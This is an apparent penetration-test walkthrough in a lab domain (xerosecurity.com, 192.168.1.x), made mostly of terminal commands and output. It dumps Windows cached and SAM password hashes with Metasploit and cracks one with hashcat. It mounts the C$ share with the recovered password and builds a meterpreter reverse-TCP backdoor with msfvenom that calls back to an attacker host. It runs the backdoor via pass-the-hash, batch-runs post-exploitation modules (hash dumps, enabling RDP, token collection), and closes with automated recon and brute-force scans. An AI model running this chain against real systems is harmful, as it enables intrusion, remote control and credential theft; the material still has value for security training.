+SESSION => 1
+msf post(cachedump) > run
+
+
+[*] Executing module against TEST-3F6416AC49
+[*] Cached Credentials Setting: 10 - (Max is 50 and 0 disables, and 10 is default)
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] XP or below system
+[*] Obtaining LK$KM...
+[*] Dumping cached credentials...
+[*] Hash are in MSCACHE format. (mscash)
+[*] MSCACHE v1 saved in: /root/.msf5/loot/20160130165258_default_192.168.1.129_mscache.creds_030856.txt
+[*] John the Ripper format:
+# mscash
+user:M$user#c158f3e72ab78ed2adb9d0fab0e1ec23:xerosecurity.comn:XEROSECURITY
+
+[*] Post module execution completed
+msf post(cachedump) > cat /root/.msf5/loot/20160130165258_default_192.168.1.129_mscache.creds_030856.txt
+
+[*] exec: cat /root/.msf5/loot/20160130165258_default_192.168.1.129_mscache.creds_030856.txt
+
+Username,Hash,Logon Domain Name,DNS Domain Name,Last Login,UPN,Effective Name,Full Name,Logon Script,Profile Path,Home Directory,HomeDir Drive,Primary Group,Additional Groups
+"user","c158f3e72ab78ed2adb9d0fab0e1ec23","XEROSECURITY","xerosecurity.comn","2016-01-30 14:36:42","[email protected]","user","user","","","","","513","513"
+CRACKING HASHES
+root@kali:~# hashcat -m 1100 /tmp/hashes2.txt /pentest/lists/passwords/
+
+Initializing hashcat v2.00 with 8 threads and 32mb segment-size...
+
+Added hashes from file /tmp/hashes2.txt: 1 (1 salts)
+Activating quick-digest mode for single-hash with salt
+
+[s]tatus [p]ause [r]esume [b]ypass [q]uit => 
+
+Input.Mode: Dict (/pentest/lists/passwords/hashkiller.com.dic)
+Index.....: 2/8 (segment), 3313392 (words), 33550341 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: 43.01M plains, 43.01M words
+Progress..: 3313392/3313392 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+c158f3e72ab78ed2adb9d0fab0e1ec23:user:Password123$
+                                             
+All hashes have been recovered
+MOUNTING CIFS
+root@kali:/mnt# mkdir winxp
+root@kali:/mnt# mount -t cifs -o username=Administrator,password=Password123$ //192.168.1.129/C$ /mnt/winxp/
+root@kali:/mnt# cd winxp/
+root@kali:/mnt/winxp# ls
+
+AUTOEXEC.BAT  boot.ini    Documents and Settings  FL Studio VSTi (Multi).dll  MSDOS.SYS     ntldr         Program Files  System Volume Information
+backdoor.exe  CONFIG.SYS  FL Studio VSTi.dll      IO.SYS                      NTDETECT.COM  pagefile.sys  RECYCLER       WINDOWS
+THE BACKDOOR
+root@kali:/mnt/winxp# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 
+LPORT=4444 -f exe > backdoor.exe
+
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+root@kali:/mnt/winxp# ls -lh
+total 773M
+-rwxr-xr-x 1 root root    0 Nov  2 10:42 AUTOEXEC.BAT
+-rwxr-xr-x 1 root root  73K Feb  1 07:36 backdoor.exe
+-rwxr-xr-x 1 root root  211 Nov  2 10:38 boot.ini
+-rwxr-xr-x 1 root root    0 Nov  2 10:42 CONFIG.SYS
+drwxr-xr-x 2 root root    0 Jan 31 14:57 Documents and Settings
+-rwxr-xr-x 1 root root 2.2M Jun 10  2014 FL Studio VSTi.dll
+-rwxr-xr-x 1 root root 2.2M Jun 10  2014 FL Studio VSTi (Multi).dll
+-r-xr-xr-x 1 root root    0 Nov  2 10:42 IO.SYS
+-r-xr-xr-x 1 root root    0 Nov  2 10:42 MSDOS.SYS
+-r-xr-xr-x 1 root root  47K Aug  4  2004 NTDETECT.COM
+-r-xr-xr-x 1 root root 245K Aug  4  2004 ntldr
+-rwxr-xr-x 1 root root 768M Jan 30 14:36 pagefile.sys
+dr-xr-xr-x 2 root root    0 Dec 26 10:31 Program Files
+drwxr-xr-x 2 root root    0 Jan 31 20:44 RECYCLER
+drwxr-xr-x 2 root root    0 Nov  2 10:45 System Volume Information
+drwxr-xr-x 2 root root    0 Jan 31 17:10 WINDOWS
+POST EXPLOITATION
+metasploit-windows-post.rc
+root@kali# vim metasploit-windows-post.rc
+
+setg SESSION 9
+use post/windows/gather/smart_hashdump
+run
+use post/windows/gather/credentials/domain_hashdump
+run
+use post/windows/gather/credentials/mcafee_vse_hashdump
+run
+use post/windows/gather/credentials/mssql_local_hashdump
+run
+use post/windows/gather/hashdump
+run
+use post/windows/gather/enum_shares
+run
+use post/windows/gather/enum_patches
+run
+use post/windows/gather/credentials/domain_hashdump
+run
+use post/windows/manage/enable_rdp
+run
+use post/windows/gather/enum_domain
+run
+use post/windows/gather/credentials/credential_collector
+run
+use post/windows/gather/enum_computers
+run
+use post/windows/gather/cachedump
+run
+use post/windows/gather/enum_ad_computers
+run
+root@kali# pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //192.168.1.129 "backdoor.exe"
+
+msf post(enum_ad_computers) > 
+[*] Sending stage (957487 bytes) to 192.168.1.129
+[*] Meterpreter session 9 opened (192.168.1.113:4444 -> 192.168.1.129:3643) at 2016-02-01 07:43:57 -0500
+
+msf post(enum_ad_computers) > 
+msf post(enum_ad_computers) > resource /pentest/windows/metasploit-windows-post-exploitation-critical.rc
+
+[*] Processing /pentest/windows/metasploit-windows-post-exploitation-critical.rc for ERB directives.
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> setg SESSION 9
+SESSION => 9
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/smart_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+
+[*] Running module against TEST-3F6416AC49
+[*] Hashes will be saved to the database if one is connected.
+[*] Hashes will be saved in loot in JtR password file format to:
+[*] /root/.msf5/loot/20160201074415_default_192.168.1.129_windows.hashes_180907.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*] 	Obtaining the boot key...
+[*] 	Calculating the hboot key using SYSKEY 4479be5b4080a2c10a6095f17c263ff5...
+[*] 	Obtaining the user list and keys...
+[*] 	Decrypting user keys...
+[*] 	Dumping password hints...
+[*] 	No users with password hints on this system
+[*] 	Dumping password hashes...
+[+] 	Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+[+] 	HelpAssistant:1000:447873b78295638165d0a1a58736c426:c379debb205ae80e84bda1b3d430b6c8:::
+[+] 	SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:1534c54bed98875639d7e77ae9d51345:::
+[+] 	test:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+[+] 	test2:1004:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665:::
+[+] 	hacker:1005:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665:::
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/credentials/domain_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[-] This does not appear to be an AD Domain Controller
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/credentials/mcafee_vse_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Looking for McAfee VSE password hashes on TEST-3F6416AC49 ...
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/credentials/mssql_local_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Running module against TEST-3F6416AC49
+[-] Post failed: RuntimeError unknown: Unable to identify a SQL client
+[-] Call stack:
+[-]   /usr/share/metasploit-framework/lib/msf/core/module.rb:291:in `fail_with'
+[-]   /usr/share/metasploit-framework/modules/post/windows/gather/credentials/mssql_local_hashdump.rb:51:in `run'
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 4479be5b4080a2c10a6095f17c263ff5...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:447873b78295638165d0a1a58736c426:c379debb205ae80e84bda1b3d430b6c8:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:1534c54bed98875639d7e77ae9d51345:::
+test:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+test2:1004:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665:::
+hacker:1005:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665:::
+
+
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/enum_shares
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Running against session 9
+[*] The following shares were found:
+[*] 	Name: C
+[*] 	Path: C:\
+[*] 	Type: 0
+[*] 
+[*] 	Name: Downloads
+[*] 	Path: C:\Documents and Settings\test\My Documents\Downloads
+[*] 	Type: 0
+[*] 
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/enum_patches
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[+] KB2871997 is missing
+[+] KB2928120 is missing
+[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
+[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
+[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
+[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
+[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
+[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/credentials/domain_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[-] This does not appear to be an AD Domain Controller
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/manage/enable_rdp
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Enabling Remote Desktop
+[*] 	RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] 	Terminal Services service is already set to auto
+[*] 	Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /root/.msf5/loot/20160201074436_default_192.168.1.129_host.windows.cle_349030.txt
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/enum_domain
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/credentials/credential_collector
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Running module against TEST-3F6416AC49
+[+] Collecting hashes...
+    Extracted: Administrator:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: hacker:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665
+    Extracted: HelpAssistant:447873b78295638165d0a1a58736c426:c379debb205ae80e84bda1b3d430b6c8
+    Extracted: SUPPORT_388945a0:aad3b435b51404eeaad3b435b51404ee:1534c54bed98875639d7e77ae9d51345
+    Extracted: test:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+    Extracted: test2:e52cac67419a9a2217e4c3576fe93615:b490b475e987909ae9bd83a65aa94665
+[+] Collecting tokens...
+    NT AUTHORITY\LOCAL SERVICE
+    NT AUTHORITY\NETWORK SERVICE
+    NT AUTHORITY\SYSTEM
+    XEROSECURITY\Administrator
+    NT AUTHORITY\ANONYMOUS LOGON
+    TEST-3F6416AC49\Administrator
+    TEST-3F6416AC49\Guest
+    TEST-3F6416AC49\test
+    XEROSECURITY\user
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/enum_computers
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Running module against TEST-3F6416AC49
+[-] This host is not part of a domain.
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/cachedump
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[*] Executing module against TEST-3F6416AC49
+[*] Cached Credentials Setting: 10 - (Max is 50 and 0 disables, and 10 is default)
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] XP or below system
+[*] Obtaining LK$KM...
+[*] Dumping cached credentials...
+[*] Hash are in MSCACHE format. (mscash)
+[*] MSCACHE v1 saved in: /root/.msf5/loot/20160201074451_default_192.168.1.129_mscache.creds_214171.txt
+[*] John the Ripper format:
+# mscash
+user:M$user#c158f3e72ab78ed2adb9d0fab0e1ec23:XEROSECURITY.COMn:XEROSECURITY
+administrator:M$administrator#0620d5420b059bf1ead3532f9ec4ddff:XEROSECURITY.COMA:XEROSECURITY
+
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> use post/windows/gather/enum_ad_computers
+resource (/pentest/windows/metasploit-windows-post-exploitation-critical.rc)> run
+[-] extapi_adsi_domain_query: Operation failed: 2147950650
+[*] Post module execution completed
+ENUMERATION
+root@kali:/pentest/loot# sniper 192.168.1.138
+
+[3;J
+                ____               
+    _________  /  _/___  ___  _____
+   / ___/ __ \ / // __ \/ _ \/ ___/
+  (__  ) / / // // /_/ /  __/ /    
+ /____/_/ /_/___/ .___/\___/_/     
+               /_/                 
+
+ + -- --=[http://crowdshield.com
+ + -- --=[sn1per v1.6 by 1N3
+
+################################### Running recon #################################
+Server:		206.248.154.22
+Address:	206.248.154.22#53
+
+** server can't find 138.1.168.192.in-addr.arpa: NXDOMAIN
+
+Host 138.1.168.192.in-addr.arpa. not found: 3(NXDOMAIN)
+
+################################### Pinging host ###################################
+PING 192.168.1.138 (192.168.1.138) 56(84) bytes of data.
+64 bytes from 192.168.1.138: icmp_seq=1 ttl=128 time=0.555 ms
+
+--- 192.168.1.138 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.555/0.555/0.555/0.000 ms
+
+################################### Running port scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 20:10 EST
+Nmap scan report for 192.168.1.138
+Host is up (0.00021s latency).
+Not shown: 65506 closed ports
+PORT      STATE SERVICE      VERSION
+42/tcp    open  tcpwrapped
+53/tcp    open  domain       Microsoft DNS
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec Windows 2003 Kerberos (server time: 2016-01-31 01:16:20Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows 98 netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds (primary domain: XEROSECURITY)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49164/tcp open  msrpc        Microsoft Windows RPC
+49165/tcp open  msrpc        Microsoft Windows RPC
+49168/tcp open  msrpc        Microsoft Windows RPC
+49170/tcp open  msrpc        Microsoft Windows RPC
+49174/tcp open  msrpc        Microsoft Windows RPC
+49188/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port445-TCP:V=7.01%I=7%D=1/30%Time=56AD6069%P=x86_64-pc-linux-gnu%r(SMB
+SF:ProgNeg,8B,"\0\0\0\x87\xffSMBr\0\0\0\0\x88\x01@\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0@\x06\0\0\x01\0\x11\x07\0\x0f2\0\x01\0\x04A\0\0\0\0\x01\0\0\0\0\0\x
+SF:fc\xf3\x01\0\xb3\xf6R\xfe\xc4\[\xd1\x01,\x01\x08B\0\^<\x83\x86R\x92\x93
+SF:\x9bX\0E\0R\0O\0S\0E\0C\0U\0R\0I\0T\0Y\0\0\0W\0I\0N\0-\x008\0M\0S\0B\x0
+SF:02\0D\0D\x005\x002\0P\x009\0\0\0");
+MAC Address: 00:0C:29:82:29:F9 (VMware)
+Device type: general purpose
+Running: Microsoft Windows 7|2012|8.1
+OS CPE: cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_2012 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: WIN-8MSB2DD52P9; OSs: Windows, Windows 98; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003, cpe:/o:microsoft:windows_98
+
+Host script results:
+|_nbstat: NetBIOS name: WIN-8MSB2DD52P9, NetBIOS user: , NetBIOS MAC: 00:0c:29:82:29:f9 (VMware)
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Datacenter 9600 (Windows Server 2012 R2 Datacenter 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: WIN-8MSB2DD52P9
+|   NetBIOS computer name: WIN-8MSB2DD52P9
+|   Domain name: xerosecurity.com
+|   Forest name: xerosecurity.com
+|   FQDN: WIN-8MSB2DD52P9.xerosecurity.com
+|_  System time: 2016-01-30T20:17:18-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.21 ms 192.168.1.138
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 408.91 seconds
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 20:17 EST
+Nmap scan report for 192.168.1.138
+Host is up (0.00021s latency).
+Not shown: 5 closed ports
+PORT    STATE         SERVICE      VERSION
+53/udp  open          domain       Microsoft DNS
+|_dns-recursion: Recursion appears to be enabled
+67/udp  open|filtered dhcps
+88/udp  open          kerberos-sec Windows 2003 Kerberos (server time: 2016-01-31 01:17:36Z)
+137/udp open          netbios-ns   Microsoft Windows netbios-ssn (workgroup: XEROSECURITY)
+138/udp open|filtered netbios-dgm
+161/udp open|filtered snmp
+| snmp-hh3c-logins: 
+|_  baseoid: 1.3.6.1.4.1.25506.2.12.1.1.1
+389/udp open|filtered ldap
+MAC Address: 00:0C:29:82:29:F9 (VMware)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+Service Info: Host: WIN-8MSB2DD52P9; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2003, cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: WIN-8MSB2DD52P9, NetBIOS user: , NetBIOS MAC: 00:0c:29:82:29:f9 (VMware)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.21 ms 192.168.1.138
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 106.15 seconds
+
+################################### Running Intrusive Scans ########################
++ -- --=[Port 21 closed... skipping.
++ -- --=[Port 22 closed... skipping.
++ -- --=[Port 23 closed... skipping.
++ -- --=[Port 25 closed... skipping.
++ -- --=[Port 53 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 20:19 EST
+Nmap scan report for 192.168.1.138
+Host is up (0.00021s latency).
+PORT   STATE SERVICE VERSION
+53/tcp open  domain?
+|_dns-fuzz: ERROR: Script execution failed (use -d to debug)
+|_dns-nsec-enum: Can't determine domain for host 192.168.1.138; use dns-nsec-enum.domains script arg.
+|_dns-nsec3-enum: Can't determine domain for host 192.168.1.138; use dns-nsec3-enum.domains script arg.
+MAC Address: 00:0C:29:82:29:F9 (VMware)
+
+Host script results:
+| dns-blacklist: 
+|   SPAM
+|_    l2.apews.org - FAIL
+|_dns-brute: Can't guess domain of "192.168.1.138"; use dns-brute.domain script argument.
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 144.06 seconds
++ -- --=[Port 79 closed... skipping.
++ -- --=[Port 80 opened... running tests...
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/  
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/    
+                                <   
+                                 ...'
+                                 
+    WAFW00F - Web Application Firewall Detection Tool
+    
+    By Sandro Gauci && Wendel G. Henrique
+
+Checking http://192.168.1.138
+Generic Detection results:
+The site http://192.168.1.138 seems to be behind a WAF 
+Reason: The server header is different when an attack is detected.
+The server header for a normal response is "Microsoft-IIS/8.5", while the server header a response to an attack is "Microsoft-HTTPAPI/2.0.",
+Number of requests: 12
+
+http://192.168.1.138 [200] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[192.168.1.138], Microsoft-IIS[8.5], Title[IIS Windows Server]
+
+
++ -- --=[Port 139 opened... running tests...
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 30 20:22:46 2016
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.1.138
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 192.168.1.138    |
+ ===================================================== 
+[+] Got domain/workgroup name: XEROSECURITY
+
+ ============================================= 
+|    Nbtstat Information for 192.168.1.138    |
+ ============================================= 
+Looking up status of 192.168.1.138
+	WIN-8MSB2DD52P9 <00> -         M   Workstation Service
+	XEROSECURITY    <00> -  M   Domain/Workgroup Name
+	XEROSECURITY    <1c> -  M   Domain Controllers
+	WIN-8MSB2DD52P9 <20> -         M   File Server Service
+	XEROSECURITY    <1b> -         M   Domain Master Browser
+
+	MAC Address = 00-0C-29-82-29-F9
+
+ ====================================== 
+|    Session Check on 192.168.1.138    |
+ ====================================== 
+[+] Server 192.168.1.138 allows sessions using username '', password ''
+
+ ============================================ 
+|    Getting domain SID for 192.168.1.138    |
+ ============================================ 
+Domain Name: XEROSECURITY
+Domain Sid: S-1-5-21-1088676282-494858925-2056655024
+[+] Host is part of a domain (not a workgroup)
+
+ ======================================= 
+|    OS information on 192.168.1.138    |
+ ======================================= 
+[+] Got OS info for 192.168.1.138 from smbclient: Domain=[XEROSECURITY] OS=[Windows Server 2012 R2 Datacenter 9600] Server=[Windows Server 2012 R2 Datacenter 6.3]
+[+] Got OS info for 192.168.1.138 from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+ ============================== 
+|    Users on 192.168.1.138    |
+ ============================== 
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ========================================== 
+|    Share Enumeration on 192.168.1.138    |
+ ========================================== 
+[E] Can't list shares: NT_STATUS_ACCESS_DENIED
+
+[+] Attempting to map shares on 192.168.1.138
+
+ ===================================================== 
+|    Password Policy Information for 192.168.1.138    |
+ ===================================================== 
+[E] Can't connect to host with supplied credentials.
+
+[E] Failed to get password policy with rpcclient
+
+
+ =============================== 
+|    Groups on 192.168.1.138    |
+ =============================== 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ======================================================================== 
+|    Users on 192.168.1.138 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+ ============================================== 
+|    Getting printer info for 192.168.1.138    |
+ ============================================== 
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sat Jan 30 20:22:46 2016
+
+Traceback (most recent call last):
+  File "bin/samrdump.py", line 159, in 
+    logger.init()
+AttributeError: 'module' object has no attribute 'init'
+Doing NBT name scan for addresses from 192.168.1.138
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.1.138    WIN-8MSB2DD52P9            00:0c:29:82:29:f9
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 20:22 EST
+Nmap scan report for 192.168.1.138
+Host is up (0.00023s latency).
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Microsoft Windows 98 netbios-ssn
+MAC Address: 00:0C:29:82:29:F9 (VMware)
+Service Info: OS: Windows 98; CPE: cpe:/o:microsoft:windows_98
+
+Host script results:
+| smb-brute: 
+|_  guest: => Valid credentials, account disabled
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: 
+|   ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: 
+|   C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: 
+|   DESKTOP: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: 
+|   IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: READ
+|   NETLOGON: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: 
+| smb-mbenum: 
+|_  ERROR: Call to Browser Service failed with status = 2184
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Datacenter 9600 (Windows Server 2012 R2 Datacenter 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: WIN-8MSB2DD52P9
+|   NetBIOS computer name: WIN-8MSB2DD52P9
+|   Domain name: xerosecurity.com
+|   Forest name: xerosecurity.com
+|   FQDN: WIN-8MSB2DD52P9.xerosecurity.com
+|_  System time: 2016-01-30T20:23:40-05:00
+|_smb-print-text: false
+| smb-psexec: Can't find the service file: nmap_service.exe (or nmap_service).
+| Due to false positives in antivirus software, this module is no
+| longer included by default. Please download it from
+| https://nmap.org/psexec/nmap_service.exe
+|_and place it in nselib/data/psexec/ under the Nmap DATADIR.
+| smb-security-mode: 
+|   account_used: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+
+ __________                __         ____  ___
+ \______   \_______ __ ___/  |_  ____ \   \/  /
+  |    |  _/\_  __ \  |  \   __\/ __ \ \     / 
+  |    |   \ |  | \/  |  /|  | \  ___/ /     \ 
+  |______  / |__|  |____/ |__|  \___  >___/\  \ 
+         \/                         \/      \_/
+
+ + -- --=[BruteX v1.3 by 1N3
+ + -- --=[http://crowdshield.com
+
+
+################################### Running Port Scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 20:29 EST
+Nmap scan report for 192.168.1.138
+Host is up (0.00081s latency).
+Not shown: 21 closed ports
+PORT    STATE SERVICE
+53/tcp  open  domain
+80/tcp  open  http
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:82:29:F9 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
+
+################################### Running Brute Force ############################
+
+ + -- --=[Port 21 closed... skipping.
+ + -- --=[Port 22 closed... skipping.
+ + -- --=[Port 23 closed... skipping.
+ + -- --=[Port 25 closed... skipping.
